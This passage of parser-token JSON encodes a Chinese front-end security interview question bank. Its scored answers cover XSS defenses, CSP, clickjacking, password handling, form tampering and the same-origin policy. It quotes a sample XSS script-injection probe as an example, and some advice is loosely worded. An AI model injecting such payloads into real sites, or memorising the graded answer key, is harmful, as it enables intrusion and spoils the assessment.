标签或脚本解析。","text":"\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。\\n","task":false,"loose":true,"text":"**2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","tokens":[{"type":"text","raw":"**2：** 输出编码：<br/>\\n\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","text":"**2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 输出编码：","text":" 输出编码：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，","text":"\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，","escaped":false},{"type":"codespan","raw":"`将<转义为&lt;，>转义为&gt;`","text":"将<转义为&lt;，>转义为&gt;"},{"type":"text","raw":"。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","text":"。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。\\n","task":false,"loose":true,"text":"**2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","tokens":[{"type":"text","raw":"**2：** 内容安全策略（CSP）：<br/>\\n\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\n\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n\\n攻击者可能会利用它来执行恶意代码。","text":"**2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 内容安全策略（CSP）：","text":" 内容安全策略（CSP）：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置","text":"\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置","escaped":false},{"type":"codespan","raw":"`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`","text":"Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com"},{"type":"text","raw":"。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和","text":"。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和","escaped":false},{"type":"codespan","raw":"`https://trusted - scripts.com`","text":"https://trusted - scripts.com"},{"type":"text","raw":"。这样可以防止外部恶意脚本的注入。","text":"。这样可以防止外部恶意脚本的注入。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如","text":"\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如","escaped":false},{"type":"codespan","raw":"`<script>alert(\'XSS\');<\/script>`","text":"<script>alert(\'XSS\');<\/script>"},{"type":"text","raw":"，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","text":"，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","task":false,"loose":true,"text":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","tokens":[{"type":"text","raw":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","text":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式","text":" 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式","escaped":false},{"type":"codespan","raw":"`（{{}}）`","text":"（{{}}）"},{"type":"text","raw":"时会对内容进行 HTML 转义，防止脚本注入。","text":"时会对内容进行 HTML 转义，防止脚本注入。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 前端如何防止点击劫持？\\n\\n","depth":2,"text":"前端如何防止点击劫持？","tokens":[{"type":"text","raw":"前端如何防止点击劫持？","text":"前端如何防止点击劫持？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","task":false,"loose":false,"text":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","tokens":[{"type":"text","raw":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","text":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","text":" 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在前端如何安全地处理用户密码？\\n\\n","depth":2,"text":"在前端如何安全地处理用户密码？","tokens":[{"type":"text","raw":"在前端如何安全地处理用户密码？","text":"在前端如何安全地处理用户密码？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。\\n- **1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。\\n- **1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。\\n","task":false,"loose":false,"text":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","tokens":[{"type":"text","raw":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","text":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","text":" 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。\\n","task":false,"loose":false,"text":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","tokens":[{"type":"text","raw":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","text":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","text":" 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","task":false,"loose":false,"text":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","tokens":[{"type":"text","raw":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","text":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","text":" 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？\\n\\n","depth":2,"text":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","tokens":[{"type":"text","raw":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","text":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。\\n- **1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。\\n- **1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。\\n","task":false,"loose":false,"text":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","tokens":[{"type":"text","raw":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","text":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","text":" 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。\\n","task":false,"loose":false,"text":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","tokens":[{"type":"text","raw":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n\\n在传输过程中没有被篡改。","text":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","text":" 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","task":false,"loose":false,"text":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","tokens":[{"type":"text","raw":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","text":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","text":" 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是同源策略，它如何影响前端安全？\\n\\n","depth":2,"text":"什么是同源策略，它如何影响前端安全？","tokens":[{"type":"text","raw":"什么是同源策略，它如何影响前端安全？","text":"什么是同源策略，它如何影响前端安全？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。\\n- **1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。\\n","task":false,"loose":false,"text":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","tokens":[{"type":"text","raw":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","text":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","text":" 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","task":false,"loose":false,"text":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","tokens":[{"type":"text","raw":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","text":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","text":" 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 同源策略相关的安全机制有哪些\\n\\n","depth":2,"text":"同源策略相关的安全机制有哪些","tokens":[{"type":"text","raw":"同源策略相关的安全机制有哪些","text":"同源策略相关的安全机制有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 